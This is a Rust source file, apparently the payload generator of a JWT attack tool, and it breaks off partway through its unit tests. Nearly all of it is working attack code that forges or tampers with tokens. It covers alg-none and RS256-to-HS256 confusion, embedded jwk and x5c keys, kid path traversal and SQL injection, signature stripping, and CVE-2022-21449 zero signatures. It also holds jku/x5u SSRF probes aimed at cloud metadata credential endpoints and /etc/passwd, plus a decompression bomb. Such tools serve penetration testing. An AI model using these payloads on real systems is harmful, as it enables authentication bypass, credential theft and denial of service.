// Payload module for JWT attack payloads
use anyhow::Result;
use base64::{engine::general_purpose, Engine};
use log::info;
use serde_json::json;
use zeroize::Zeroize;

/// Extract the claims (second) part from a JWT token string
fn extract_claims_part(token: &str) -> Result<&str> {
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() < 2 {
        return Err(anyhow::anyhow!("Invalid token format"));
    }
    Ok(parts[1])
}

/// Encode a JSON header and combine with claims part into a JWT-like string
fn encode_header_with_claims(header: &serde_json::Value, claims_part: &str) -> Result<String> {
    let header_json = serde_json::to_string(header)?;
    let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
    Ok(format!("{encoded_header}.{claims_part}"))
}

/// Build a header.payload signing input from a header JSON value and an existing claims part.
fn build_signing_input(header: &serde_json::Value, claims_part: &str) -> Result<String> {
    let header_json = serde_json::to_string(header)?;
    let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
    Ok(format!("{encoded_header}.{claims_part}"))
}

/// Sign an arbitrary signing input with HS256 and return a JWT-formatted token (header.payload.sig).
fn sign_hs256(input: &str, secret: &[u8]) -> String {
    let mut mac = hmac_sha256::HMAC::mac(input.as_bytes(), secret);
    let sig_b64 = general_purpose::URL_SAFE_NO_PAD.encode(mac.as_slice());
    mac.zeroize();
    format!("{input}.{sig_b64}")
}

/// Read the original `alg` value from a JWT header (without verifying anything).
fn original_alg(token: &str) -> Option<String> {
    let parts: Vec<&str> = token.split('.').collect();
    let header_b64 = parts.first()?;
    let header_bytes = general_purpose::URL_SAFE_NO_PAD.decode(header_b64).ok()?;
    let header_json: serde_json::Value = serde_json::from_slice(&header_bytes).ok()?;
    header_json
        .get("alg")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string())
}

/// Generate none algorithm payloads
pub fn generate_none_payload(token: &str, alg_value: &str) -> Result<String> {
    let claims_part = extract_claims_part(token)?;

    let header = json!({
        "alg": alg_value,
        "typ": "JWT"
    });

    info!(
        "Generate {alg_value} payload header=\"{}\" payload={alg_value}",
        serde_json::to_string(&header)?
    );

    encode_header_with_claims(&header, claims_part)
}

/// Generate JKU and X5U payloads for URL manipulation attacks
pub fn generate_url_payload(
    token: &str,
    key_type: &str,
    domain: &str,
    trust_domain: Option<&str>,
    protocol: &str,
) -> Result<Vec<String>> {
    let mut payloads = Vec::new();
    let claims_part = extract_claims_part(token)?;

    // Basic payload
    let header = json!({
        "alg": "hs256",
        key_type: domain,
        "typ": "JWT"
    });
    info!(
        "Generate {key_type} + basic payload header=\"{}\" payload={key_type}",
        serde_json::to_string(&header)?
    );
    payloads.push(encode_header_with_claims(&header, claims_part)?);

    // If trust domain is provided, generate bypass payloads
    if let Some(trust_domain) = trust_domain {
        let bypass_urls = [
            format!("{}://{}{}{}", protocol, trust_domain, "Z", domain),
            format!("{protocol}://{trust_domain}@{domain}"),
            format!("{protocol}://{trust_domain}%0d0aHost: {domain}"),
        ];

        for url in &bypass_urls {
            let header = json!({
                "alg": "hs256",
                key_type: url,
                "typ": "JWT"
            });
            info!(
                "Generate {key_type} bypass payload header=\"{}\" payload={key_type}",
                serde_json::to_string(&header)?
            );
            payloads.push(encode_header_with_claims(&header, claims_part)?);
        }
    }

    Ok(payloads)
}

/// Generate algorithm confusion attacks.
///
/// For asymmetric source algorithms (RS*, PS*, ES*, EdDSA) emits a set of header
/// variants that downgrade to the matching HMAC family plus a `none` downgrade.
/// If a PEM-encoded public key is provided, additionally produces a fully signed
/// HMAC token where the **public key bytes are used as the HMAC secret** — the
/// canonical real-world RS256→HS256 attack. Without the key, the HMAC variants
/// are emitted unsigned (header.payload only) so callers can re-sign once they
/// recover the server's public key.
pub fn generate_alg_confusion_payload(
    token: &str,
    public_key: Option<&str>,
) -> Result<Vec<String>> {
    let claims_part = extract_claims_part(token)?;

    let source_alg = original_alg(token).unwrap_or_else(|| "RS256".to_string());
    let source_upper = source_alg.to_uppercase();

    // Pick target HMAC algorithm matching the source's hash size.
    let hmac_target = match source_upper.as_str() {
        "RS384" | "PS384" | "ES384" => "HS384",
        "RS512" | "PS512" | "ES512" => "HS512",
        // RS256 / PS256 / ES256 / EdDSA / unknown — default to HS256
        _ => "HS256",
    };

    let mut payloads = Vec::new();

    // HMAC downgrade variant: signed with public-key bytes if provided, else
    // emitted unsigned (header.payload only).
    let hmac_header = json!({ "alg": hmac_target, "typ": "JWT" });
    match public_key {
        Some(pem) => {
            let input = build_signing_input(&hmac_header, claims_part)?;
            let sig_b64 = match hmac_target {
                "HS256" => {
                    let mut m = hmac_sha256::HMAC::mac(input.as_bytes(), pem.as_bytes());
                    let out = general_purpose::URL_SAFE_NO_PAD.encode(m.as_slice());
                    m.zeroize();
                    out
                }
                other => {
                    let algo = match other {
                        "HS384" => jsonwebtoken::Algorithm::HS384,
                        _ => jsonwebtoken::Algorithm::HS512,
                    };
                    let key = jsonwebtoken::EncodingKey::from_secret(pem.as_bytes());
                    // jsonwebtoken returns the base64url-encoded signature directly.
                    jsonwebtoken::crypto::sign(input.as_bytes(), &key, algo)?
                }
            };
            payloads.push(format!("{input}.{sig_b64}"));
        }
        None => {
            payloads.push(encode_header_with_claims(&hmac_header, claims_part)?);
        }
    }

    // `none` downgrade — never signed regardless of public_key.
    let none_header = json!({ "alg": "none", "typ": "JWT" });
    payloads.push(encode_header_with_claims(&none_header, claims_part)?);

    info!(
        "Generated algorithm confusion payloads: {} -> {} (+none)",
        source_upper, hmac_target
    );

    Ok(payloads)
}

/// Generate a JWT with an attacker-controlled key embedded in the `jwk` header.
///
/// Some libraries trust a JWK supplied directly in the JOSE header as the
/// verification key. This generates a fresh RSA-2048 key pair, embeds the
/// public key as a JWK in the header, and signs the token with the matching
/// private key — producing a fully verifiable attack token.
pub fn generate_jwk_embed_payload(token: &str) -> Result<String> {
    use rsa::pkcs8::EncodePrivateKey;
    use rsa::traits::PublicKeyParts;
    use rsa::RsaPrivateKey;

    let claims_part = extract_claims_part(token)?;

    let mut rng = rsa::rand_core::OsRng;
    let private_key = RsaPrivateKey::new(&mut rng, 2048)
        .map_err(|e| anyhow::anyhow!("Failed to generate RSA key: {}", e))?;
    let public_key = private_key.to_public_key();

    let n_b64 = general_purpose::URL_SAFE_NO_PAD.encode(public_key.n().to_bytes_be());
    let e_b64 = general_purpose::URL_SAFE_NO_PAD.encode(public_key.e().to_bytes_be());

    let kid = "jwt-hack-injected";
    let jwk = json!({
        "kty": "RSA",
        "use": "sig",
        "alg": "RS256",
        "kid": kid,
        "n": n_b64,
        "e": e_b64,
    });

    let header = json!({
        "alg": "RS256",
        "typ": "JWT",
        "kid": kid,
        "jwk": jwk,
    });

    let input = build_signing_input(&header, claims_part)?;
    let pem = private_key
        .to_pkcs8_pem(rsa::pkcs8::LineEnding::LF)
        .map_err(|e| anyhow::anyhow!("Failed to export private key: {}", e))?
        .to_string();
    let key = jsonwebtoken::EncodingKey::from_rsa_pem(pem.as_bytes())?;
    let sig_b64 =
        jsonwebtoken::crypto::sign(input.as_bytes(), &key, jsonwebtoken::Algorithm::RS256)?;

    info!("Generated jwk-embedded RS256 payload (signed with embedded key)");

    Ok(format!("{input}.{sig_b64}"))
}

/// Generate kid header path-traversal / file-substitution payloads.
///
/// When a server resolves the `kid` value as a file path to load a key, an
/// attacker can substitute a file with known contents (empty for `/dev/null`,
/// or a predictable file) and forge a valid HMAC signature using those bytes
/// as the secret. Each payload is fully signed against the substituted "key".
pub fn generate_kid_traversal_payload(token: &str) -> Result<Vec<String>> {
    let claims_part = extract_claims_part(token)?;

    // (kid value, secret bytes the server would load when resolving it)
    let cases: &[(&str, &[u8])] = &[
        ("/dev/null", b""),
        ("../../../../../../dev/null", b""),
        ("..\\..\\..\\..\\..\\dev\\null", b""),
        ("file:///dev/null", b""),
        ("/var/empty/null", b""),
        // Plain read-attempts — sig won't verify but exposes path-traversal/LFI behavior
        ("../../../../../../etc/passwd", b""),
        ("/etc/passwd", b""),
        // Null-byte truncation hint
        ("legit-key\x00../../../dev/null", b""),
    ];

    let mut payloads = Vec::with_capacity(cases.len());
    for (kid, secret) in cases {
        let header = json!({
            "alg": "HS256",
            "typ": "JWT",
            "kid": kid,
        });
        let input = build_signing_input(&header, claims_part)?;
        payloads.push(sign_hs256(&input, secret));
    }

    info!("Generated kid path-traversal payloads (signed with empty secret)");
    Ok(payloads)
}

/// Generate `crit` header bypass payloads.
///
/// RFC 7515 §4.1.11 requires implementations to reject tokens with unrecognised
/// `crit` parameters. Libraries that ignore the rule can be tricked into
/// honouring unknown headers (or skipping signature checks).
pub fn generate_crit_payload(token: &str) -> Result<Vec<String>> {
    let claims_part = extract_claims_part(token)?;

    let variants: Vec<serde_json::Value> = vec![
        json!({ "alg": "HS256", "typ": "JWT", "crit": ["b64"], "b64": false }),
        json!({ "alg": "HS256", "typ": "JWT", "crit": ["x-custom"], "x-custom": "bypass" }),
        json!({ "alg": "none", "typ": "JWT", "crit": ["alg"] }),
        // Empty crit — some libs misparse and skip signature validation
        json!({ "alg": "HS256", "typ": "JWT", "crit": [] }),
    ];

    let mut payloads = Vec::with_capacity(variants.len());
    for header in variants {
        payloads.push(encode_header_with_claims(&header, claims_part)?);
    }
    info!("Generated crit header bypass payloads");
    Ok(payloads)
}

/// Generate RFC 7797 unencoded payload (`b64: false`) attack payloads.
pub fn generate_b64_payload(token: &str) -> Result<Vec<String>> {
    let claims_part = extract_claims_part(token)?;

    let variants: Vec<serde_json::Value> = vec![
        json!({ "alg": "HS256", "typ": "JWT", "b64": false, "crit": ["b64"] }),
        json!({ "alg": "RS256", "typ": "JWT", "b64": false, "crit": ["b64"] }),
        // b64=false without crit — many libs silently honour it
        json!({ "alg": "HS256", "typ": "JWT", "b64": false }),
    ];

    let mut payloads = Vec::with_capacity(variants.len());
    for header in variants {
        payloads.push(encode_header_with_claims(&header, claims_part)?);
    }
    info!("Generated b64 (RFC 7797) bypass payloads");
    Ok(payloads)
}

/// Generate signature-stripped / empty-signature payloads.
///
/// Some libraries treat an empty third segment as a valid signature when the
/// algorithm is not explicitly `none`. The original header is preserved so
/// the server still sees its expected `alg`.
pub fn generate_empty_sig_payload(token: &str) -> Result<Vec<String>> {
    let claims_part = extract_claims_part(token)?;
    let header_b64 = token.split('.').next().unwrap_or("");

    let payloads = vec![
        // Empty signature segment
        format!("{header_b64}.{claims_part}."),
        // No third segment at all
        format!("{header_b64}.{claims_part}"),
        // Literal "null" — some JSON-aware parsers accept
        format!("{header_b64}.{claims_part}.null"),
    ];
    info!("Generated signature-stripped payloads");
    Ok(payloads)
}

/// Generate kid header SQL injection payloads
pub fn generate_kid_sql_payload(token: &str) -> Result<Vec<String>> {
    let claims_part = extract_claims_part(token)?;

    let sql_injection_patterns = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' UNION SELECT 'secret-key' --",
        "' OR 1=1 #",
        "' OR 1=1 -- -",
        "x' UNION SELECT 'key",
        "key-0",
    ];

    let payloads: Result<Vec<String>> = sql_injection_patterns
        .iter()
        .map(|pattern| {
            let header = json!({
                "alg": "HS256",
                "typ": "JWT",
                "kid": pattern
            });
            encode_header_with_claims(&header, claims_part)
        })
        .collect();

    info!("Generated kid SQL injection payloads");

    payloads
}

/// Generate x5c header injection payloads
pub fn generate_x5c_payload(token: &str) -> Result<Vec<String>> {
    let claims_part = extract_claims_part(token)?;

    let sample_certificates = [
        vec!["MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA"],
        vec![
            "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA",
            "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA2",
        ],
    ];

    let payloads: Result<Vec<String>> = sample_certificates
        .iter()
        .map(|cert_chain| {
            let header = json!({
                "alg": "RS256",
                "typ": "JWT",
                "x5c": cert_chain
            });
            encode_header_with_claims(&header, claims_part)
        })
        .collect();

    info!("Generated x5c header injection payloads");

    payloads
}

/// Generate cty header manipulation payloads
pub fn generate_cty_payload(token: &str) -> Result<Vec<String>> {
    let claims_part = extract_claims_part(token)?;

    let content_types = [
        "text/xml",
        "application/xml",
        "application/x-java-serialized-object",
        "application/json+x-jackson-smile",
    ];

    let payloads: Result<Vec<String>> = content_types
        .iter()
        .map(|cty| {
            let header = json!({
                "alg": "HS256",
                "typ": "JWT",
                "cty": cty
            });
            encode_header_with_claims(&header, claims_part)
        })
        .collect();

    info!("Generated cty header manipulation payloads");

    payloads
}

/// Generate a JWT with a self-signed X.509 chain embedded in the `x5c` header.
///
/// Mirrors [`generate_jwk_embed_payload`] but uses the `x5c` certificate chain
/// instead of a `jwk`. Generates a fresh RSA-2048 key pair, builds a minimal
/// self-signed certificate, embeds its DER in `x5c` (base64 — *not* base64url —
/// per RFC 7515 §4.1.6), and signs the token with the matching private key.
/// Libraries that derive the verification key from `x5c[0]` will validate it.
pub fn generate_x5c_signed_payload(token: &str) -> Result<String> {
    use openssl::asn1::Asn1Time;
    use openssl::bn::BigNum;
    use openssl::hash::MessageDigest;
    use openssl::pkey::PKey;
    use openssl::rsa::Rsa;
    use openssl::x509::{X509Builder, X509NameBuilder};

    let claims_part = extract_claims_part(token)?;

    let rsa = Rsa::generate(2048).map_err(|e| anyhow::anyhow!("RSA gen failed: {e}"))?;
    let pkey = PKey::from_rsa(rsa).map_err(|e| anyhow::anyhow!("PKey from RSA failed: {e}"))?;

    let mut name = X509NameBuilder::new()?;
    name.append_entry_by_text("CN", "jwt-hack-injected")?;
    let name = name.build();

    let mut builder = X509Builder::new()?;
    builder.set_version(2)?;
    let serial = BigNum::from_u32(1)?.to_asn1_integer()?;
    builder.set_serial_number(&serial)?;
    builder.set_subject_name(&name)?;
    builder.set_issuer_name(&name)?;
    builder.set_pubkey(&pkey)?;
    let not_before = Asn1Time::days_from_now(0)?;
    let not_after = Asn1Time::days_from_now(365)?;
    builder.set_not_before(&not_before)?;
    builder.set_not_after(&not_after)?;
    builder.sign(&pkey, MessageDigest::sha256())?;
    let cert = builder.build();
    let cert_der = cert.to_der()?;

    // RFC 7515 §4.1.6: x5c values are standard base64, not URL-safe base64.
    let cert_b64 = base64::engine::general_purpose::STANDARD.encode(&cert_der);

    let header = json!({
        "alg": "RS256",
        "typ": "JWT",
        "x5c": [cert_b64],
    });

    let input = build_signing_input(&header, claims_part)?;
    let pem = pkey
        .private_key_to_pem_pkcs8()
        .map_err(|e| anyhow::anyhow!("export private key: {e}"))?;
    let key = jsonwebtoken::EncodingKey::from_rsa_pem(&pem)?;
    let sig_b64 =
        jsonwebtoken::crypto::sign(input.as_bytes(), &key, jsonwebtoken::Algorithm::RS256)?;

    info!("Generated x5c self-signed certificate payload (signed)");
    Ok(format!("{input}.{sig_b64}"))
}

/// Generate ECDSA "psychic signature" payloads (CVE-2022-21449).
///
/// Java JDK 15–18 accepted ECDSA signatures with r=s=0. With those bytes in
/// the signature segment, the JVM's verifier returned `true` regardless of
/// the input. Emits ES256/ES384/ES512 variants — the signature is the
/// algorithm's expected length filled with NUL bytes.
pub fn generate_psychic_signature_payload(token: &str) -> Result<Vec<String>> {
    let claims_part = extract_claims_part(token)?;

    // (alg, signature length in bytes)
    // ES256: r||s = 32+32, ES384: 48+48, ES512: 66+66 (P-521 component size).
    let variants = [("ES256", 64usize), ("ES384", 96), ("ES512", 132)];

    let mut payloads = Vec::with_capacity(variants.len());
    for (alg, sig_len) in variants {
        let header = json!({ "alg": alg, "typ": "JWT" });
        let input = build_signing_input(&header, claims_part)?;
        let zero_sig = vec![0u8; sig_len];
        let sig_b64 = general_purpose::URL_SAFE_NO_PAD.encode(&zero_sig);
        payloads.push(format!("{input}.{sig_b64}"));
    }
    info!("Generated psychic-signature (CVE-2022-21449) payloads");
    Ok(payloads)
}

/// Generate `typ` confusion header payloads.
///
/// Targets servers that key authorization decisions off `typ` (e.g. ID-token
/// vs access-token discrimination, OAuth 2.0 `at+jwt`). All variants are
/// header-only (header.payload, no signature) since the target server's
/// behaviour determines whether the variant is exploitable.
pub fn generate_typ_confusion_payload(token: &str) -> Result<Vec<String>> {
    let claims_part = extract_claims_part(token)?;

    // (typ value, alg)
    let variants: &[(Option<&str>, &str)] = &[
        (None, "HS256"), // typ omitted entirely
        (Some("at+jwt"), "HS256"),
        (Some("JOSE"), "HS256"),
        (Some("JOSE+JSON"), "HS256"),
        (Some("application/jwt"), "HS256"),
        (Some("jwt"), "HS256"),         // lowercase
        (Some("JWT\u{0000}"), "HS256"), // trailing NUL
    ];

    let mut payloads = Vec::with_capacity(variants.len());
    for (typ, alg) in variants {
        let header = match typ {
            Some(t) => json!({ "alg": alg, "typ": t }),
            None => json!({ "alg": alg }),
        };
        payloads.push(encode_header_with_claims(&header, claims_part)?);
    }
    info!("Generated typ confusion payloads");
    Ok(payloads)
}

/// Generate `alg` edge-value header payloads.
///
/// Probes parser quirks: empty, null, whitespace-padded, mixed-case, array
/// forms. Each header is emitted unsigned (header.payload) because the
/// interesting behaviour is the parser's interpretation of `alg`.
pub fn generate_alg_edge_payload(token: &str) -> Result<Vec<String>> {
    let claims_part = extract_claims_part(token)?;

    let variants: Vec<serde_json::Value> = vec![
        json!({ "alg": "",        "typ": "JWT" }),
        json!({ "alg": serde_json::Value::Null, "typ": "JWT" }),
        json!({ "alg": " HS256 ", "typ": "JWT" }),
        json!({ "alg": "\tHS256", "typ": "JWT" }),
        json!({ "alg": "hs256",   "typ": "JWT" }),
        json!({ "alg": "HS256\u{0000}", "typ": "JWT" }),
        // Array forms — some parsers cast to string-ish.
        json!({ "alg": ["none", "HS256"], "typ": "JWT" }),
        json!({ "alg": ["HS256"], "typ": "JWT" }),
    ];

    let mut payloads = Vec::with_capacity(variants.len());
    for header in variants {
        payloads.push(encode_header_with_claims(&header, claims_part)?);
    }
    info!("Generated alg edge-value payloads");
    Ok(payloads)
}

/// Built-in SSRF/internal-network probe URLs for jku/x5u attacks.
///
/// Useful when the server fetches the JWKS URL server-side — these probes
/// don't require a controlled attacker domain.
fn ssrf_probe_urls() -> &'static [&'static str] {
    &[
        // AWS IMDS v1
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        // GCP metadata
        "http://metadata.google.internal/computeMetadata/v1/",
        // Azure IMDS
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        // Loopback common services
        "http://127.0.0.1:6379/",
        "http://localhost:11211/",
        "http://127.0.0.1:80/",
        // Schemes
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_INFO%0d%0a",
        // DNS rebind / shorthand
        "http://[::1]/",
        "http://0.0.0.0/",
    ]
}

/// Generate jku/x5u SSRF-probe payloads (no `--jwk-attack` required).
pub fn generate_jku_x5u_ssrf_payload(token: &str) -> Result<Vec<String>> {
    let claims_part = extract_claims_part(token)?;
    let mut payloads = Vec::new();
    for key_type in ["jku", "x5u"] {
        for url in ssrf_probe_urls() {
            let header = json!({
                "alg": "hs256",
                key_type: url,
                "typ": "JWT",
            });
            payloads.push(encode_header_with_claims(&header, claims_part)?);
        }
    }
    info!("Generated jku/x5u SSRF probe payloads");
    Ok(payloads)
}

/// Generate `zip` parameter variants and a DEFLATE decompression-bomb claim.
///
/// Covers: non-standard zip values (GZIP, unknown, null), and a real
/// compression bomb where the encoded claims segment is small but decompresses
/// to a large JSON object — useful for probing DoS handling.
pub fn generate_zip_payload(token: &str) -> Result<Vec<String>> {
    let claims_part = extract_claims_part(token)?;
    let mut payloads = Vec::new();

    // Non-standard zip header values — claims segment stays the original.
    for zip_val in [
        json!("GZIP"),
        json!("unknown"),
        json!(""),
        serde_json::Value::Null,
        json!(["DEF"]),
    ] {
        let header = json!({ "alg": "HS256", "typ": "JWT", "zip": zip_val });
        payloads.push(encode_header_with_claims(&header, claims_part)?);
    }

    // Decompression bomb: payload of 1 MiB of 'A' characters wrapped in a JSON
    // string. DEFLATE compresses this down to a few hundred bytes; the server
    // pays the decompression cost.
    let bomb_json = format!("{{\"data\":\"{}\"}}", "A".repeat(1024 * 1024));
    let compressed = crate::utils::compression::compress_deflate(bomb_json.as_bytes())?;
    let bomb_claims_b64 = general_purpose::URL_SAFE_NO_PAD.encode(&compressed);
    let bomb_header = json!({ "alg": "HS256", "typ": "JWT", "zip": "DEF" });
    let bomb_header_json = serde_json::to_string(&bomb_header)?;
    let bomb_header_b64 = general_purpose::URL_SAFE_NO_PAD.encode(bomb_header_json.as_bytes());
    // Sign with empty HMAC so downstream test consumers can verify shape; the
    // server may reject before signature check, which is itself useful info.
    let signing = format!("{bomb_header_b64}.{bomb_claims_b64}");
    payloads.push(sign_hs256(&signing, b""));

    info!("Generated zip variant + decompression bomb payloads");
    Ok(payloads)
}

/// Generate `kid` payloads pointing at predictable, content-stable files.
///
/// When `secret_bytes` is provided, every payload is HS256-signed with those
/// bytes (matching the file's contents on disk). With `None`, only the empty
/// secret is assumed — useful for `/dev/null`-style nulls, otherwise the
/// caller should re-sign with the file's bytes once known.
pub fn generate_kid_predictable_payload(
    token: &str,
    secret_bytes: Option<&[u8]>,
) -> Result<Vec<String>> {
    let claims_part = extract_claims_part(token)?;

    let candidate_paths = [
        "css/main.css",
        "static/css/main.css",
        "js/main.js",
        "static/js/main.js",
        "robots.txt",
        "favicon.ico",
        "index.html",
        "../static/css/main.css",
        "../../static/css/main.css",
        "../../../static/css/main.css",
        "public/index.html",
        "assets/logo.svg",
    ];

    let secret = secret_bytes.unwrap_or(b"");
    let mut payloads = Vec::with_capacity(candidate_paths.len());
    for kid in candidate_paths {
        let header = json!({
            "alg": "HS256",
            "typ": "JWT",
            "kid": kid,
        });
        let input = build_signing_input(&header, claims_part)?;
        payloads.push(sign_hs256(&input, secret));
    }
    info!(
        "Generated kid predictable-path payloads ({} bytes secret)",
        secret.len()
    );
    Ok(payloads)
}

/// Generate all available payloads for a token
pub fn generate_all_payloads(
    token: &str,
    jwk_trust: Option<&str>,
    jwk_attack: Option<&str>,
    jwk_protocol: &str,
    target: Option<&str>,
) -> Result<Vec<String>> {
    let mut payloads = Vec::new();

    // Parse target parameter
    let targets: std::collections::HashSet<String> = match target {
        Some(t) => t.split(',').map(|s| s.trim().to_lowercase()).collect(),
        None => std::collections::HashSet::from(["all".to_string()]),
    };

    let should_generate_all = targets.contains("all");

    // None algorithm payloads
    if should_generate_all || targets.contains("none") {
        payloads.push(generate_none_payload(token, "none")?);
        payloads.push(generate_none_payload(token, "NonE")?);
        payloads.push(generate_none_payload(token, "NONE")?);
    }

    // URL payloads if attack domain is provided
    if let Some(attack_domain) = jwk_attack {
        // JKU payloads
        if should_generate_all || targets.contains("jku") {
            let jku_payloads =
                generate_url_payload(token, "jku", attack_domain, jwk_trust, jwk_protocol)?;
            payloads.extend(jku_payloads);
        }

        // X5U payloads
        if should_generate_all || targets.contains("x5u") {
            let x5u_payloads =
                generate_url_payload(token, "x5u", attack_domain, jwk_trust, jwk_protocol)?;
            payloads.extend(x5u_payloads);
        }
    }

    // Algorithm confusion payloads
    if should_generate_all || targets.contains("alg_confusion") {
        let alg_confusion_payloads = generate_alg_confusion_payload(token, None)?;
        payloads.extend(alg_confusion_payloads);
    }

    // kid SQL injection payloads
    if should_generate_all || targets.contains("kid_sql") {
        let kid_sql_payloads = generate_kid_sql_payload(token)?;
        payloads.extend(kid_sql_payloads);
    }

    // x5c header injection payloads
    if should_generate_all || targets.contains("x5c") {
        let x5c_payloads = generate_x5c_payload(token)?;
        payloads.extend(x5c_payloads);
    }

    // cty header manipulation payloads
    if should_generate_all || targets.contains("cty") {
        let cty_payloads = generate_cty_payload(token)?;
        payloads.extend(cty_payloads);
    }

    // jwk embedded header (real, signed attack)
    if should_generate_all || targets.contains("jwk_embed") {
        // This is intentionally allowed to bubble — RSA generation rarely fails.
        let p = generate_jwk_embed_payload(token)?;
        payloads.push(p);
    }

    // kid path-traversal payloads
    if should_generate_all || targets.contains("kid_traversal") {
        payloads.extend(generate_kid_traversal_payload(token)?);
    }

    // crit header bypass payloads
    if should_generate_all || targets.contains("crit") {
        payloads.extend(generate_crit_payload(token)?);
    }

    // RFC 7797 b64=false payloads
    if should_generate_all || targets.contains("b64") {
        payloads.extend(generate_b64_payload(token)?);
    }

    // Empty / stripped signature payloads
    if should_generate_all || targets.contains("empty_sig") {
        payloads.extend(generate_empty_sig_payload(token)?);
    }

    // x5c self-signed certificate (real, signed attack)
    if should_generate_all || targets.contains("x5c_signed") {
        payloads.push(generate_x5c_signed_payload(token)?);
    }

    // ECDSA psychic signatures (CVE-2022-21449)
    if should_generate_all || targets.contains("psychic") {
        payloads.extend(generate_psychic_signature_payload(token)?);
    }

    // typ confusion header variants
    if should_generate_all || targets.contains("typ_confusion") {
        payloads.extend(generate_typ_confusion_payload(token)?);
    }

    // alg edge values
    if should_generate_all || targets.contains("alg_edge") {
        payloads.extend(generate_alg_edge_payload(token)?);
    }

    // jku/x5u SSRF probes (no --jwk-attack required)
    if should_generate_all || targets.contains("ssrf") {
        payloads.extend(generate_jku_x5u_ssrf_payload(token)?);
    }

    // zip variants + decompression bomb
    if should_generate_all || targets.contains("zip") {
        payloads.extend(generate_zip_payload(token)?);
    }

    // kid predictable-path payloads (empty secret; CLI may pass bytes later)
    if should_generate_all || targets.contains("kid_predictable") {
        payloads.extend(generate_kid_predictable_payload(token, None)?);
    }

    Ok(payloads)
}

#[cfg(test)]
mod tests {
    use super::*;
    use base64::engine::general_purpose::URL_SAFE_NO_PAD;
    use serde_json::Value; // Engine trait itself is not directly used, URL_SAFE_NO_PAD is an instance

    const DUMMY_TOKEN: &str = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";

    fn get_header_from_token(token_str: &str) -> Option<Value> {
        let parts: Vec<&str> = token_str.split('.').collect();
        if parts.is_empty() {
            // Should be parts.len() < 1, or more robustly parts.get(0).is_none()
            return None;
        }
        URL_SAFE_NO_PAD
            .decode(parts[0])
            .ok()
            .and_then(|bytes| serde_json::from_slice(&bytes).ok())
    }

    #[test]
    fn test_generate_none_payload_lowercase() {
        let result = generate_none_payload(DUMMY_TOKEN, "none");
        assert!(result.is_ok());
        let token = result.unwrap();
        // The function generate_none_payload currently creates a token with 2 parts (header.payload)
        assert_eq!(token.split('.').count(), 2, "Token should have 2 parts for 'none' alg without signature part explicitly added by the function.");

        let header =
            get_header_from_token(&token).expect("Failed to decode header from generated token");
        assert_eq!(header.get("alg").unwrap().as_str().unwrap(), "none");
        assert_eq!(header.get("typ").unwrap().as_str().unwrap(), "JWT");
    }

    #[test]
    fn test_generate_none_payload_mixed_case() {
        let result = generate_none_payload(DUMMY_TOKEN, "NonE");
        assert!(result.is_ok());
        let token = result.unwrap();
        let header =
            get_header_from_token(&token).expect("Failed to decode header from generated token");
        assert_eq!(header.get("alg").unwrap().as_str().unwrap(), "NonE");
    }

    #[test]
    fn test_generate_none_payload_uppercase() {
        let result = generate_none_payload(DUMMY_TOKEN, "NONE");
        assert!(result.is_ok());
        let token = result.unwrap();
        let header =
            get_header_from_token(&token).expect("Failed to decode header from generated token");
        assert_eq!(header.get("alg").unwrap().as_str().unwrap(), "NONE");
    }

    #[test]
    fn test_generate_none_payload_invalid_token_format() {
        let result = generate_none_payload("invalidtoken", "none"); // Only one part
        assert!(
            result.is_err(),
            "Expected error for invalid token format (single part)"
        );

        // For "headeronly.", parts are ["headeronly", ""]. len is 2. generate_none_payload should work.
        let result_no_payload = generate_none_payload("headeronly.", "none");
        assert!(
            result_no_payload.is_ok(),
            "Expected Ok for token 'headeronly.', got {:?}",
            result_no_payload.err()
        );
    }

    #[test]
    fn test_generate_url_payload_jku_basic() {
        let result = generate_url_payload(DUMMY_TOKEN, "jku", "attacker.com", None, "http");
        assert!(result.is_ok());
        let payloads = result.unwrap();
        assert_eq!(payloads.len(), 1);
        let header =
            get_header_from_token(&payloads[0]).expect("Failed to decode header from JKU payload");
        assert_eq!(header.get("alg").unwrap().as_str().unwrap(), "hs256"); // Default alg in function
        assert_eq!(header.get("typ").unwrap().as_str().unwrap(), "JWT");
        assert_eq!(header.get("jku").unwrap().as_str().unwrap(), "attacker.com");
    }

    #[test]
    fn test_generate_url_payload_x5u_with_trust() {
        let result = generate_url_payload(
            DUMMY_TOKEN,
            "x5u",
            "attacker.com",
            Some("victim.com"),
            "https",
        );
        assert!(result.is_ok());
        let payloads = result.unwrap();
        // Expected: basic, bypass_z, bypass_at, crlf = 4 payloads
        assert_eq!(
            payloads.len(),
            4,
            "Unexpected number of payloads for x5u with trust domain"
        );

        // Check basic payload
        let basic_payload = payloads
            .iter()
            .find(|p| {
                let hdr = get_header_from_token(p).unwrap();
                hdr.get("x5u").unwrap().as_str().unwrap() == "attacker.com"
            })
            .expect("Basic attacker.com payload not found");
        let basic_header = get_header_from_token(basic_payload).unwrap();
        assert_eq!(
            basic_header.get("x5u").unwrap().as_str().unwrap(),
            "attacker.com"
        );

        // Check for one of the bypass payloads (e.g., Z separator)
        assert!(
            payloads.iter().any(|p| {
                get_header_from_token(p)
                    .unwrap()
                    .get("x5u")
                    .unwrap()
                    .as_str()
                    .unwrap()
                    .contains("victim.comZattacker.com")
            }),
            "Bypass payload with Z separator not found"
        );
        assert!(
            payloads.iter().any(|p| {
                get_header_from_token(p)
                    .unwrap()
                    .get("x5u")
                    .unwrap()
                    .as_str()
                    .unwrap()
                    .contains("victim.com@attacker.com")
            }),
            "Bypass payload with @ separator not found"
        );
        assert!(
            payloads.iter().any(|p| {
                get_header_from_token(p)
                    .unwrap()
                    .get("x5u")
                    .unwrap()
                    .as_str()
                    .unwrap()
